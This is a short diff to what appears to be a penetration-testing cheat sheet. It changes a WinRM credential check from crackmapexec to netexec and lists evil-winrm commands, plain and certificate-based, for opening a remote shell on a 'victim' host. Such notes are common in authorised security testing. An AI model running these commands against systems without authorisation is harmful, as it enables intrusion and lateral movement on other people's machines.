@@ -88,7 +88,7 @@
 ### evil-winrm
 - port 5985 remote management port
 - connecting to victim get full shell for memory inject / other nasty shit
-- Check if vulnable ``` crackmapexec winrm {ip} -u {username} -p "{password}" -d {domain} ```
+- Check if vulnable ``` netexec winrm {ip} -u {username} -p "{password}" -d {domain} ```
 - ``` evil-winrm -i {ip} -u {username not service name} -p "{password}" ```
 ### evil-winrm (Secured)
 - ``` evil-winrm -S -i {host} -c {key.cert} -k {key.pem} ```
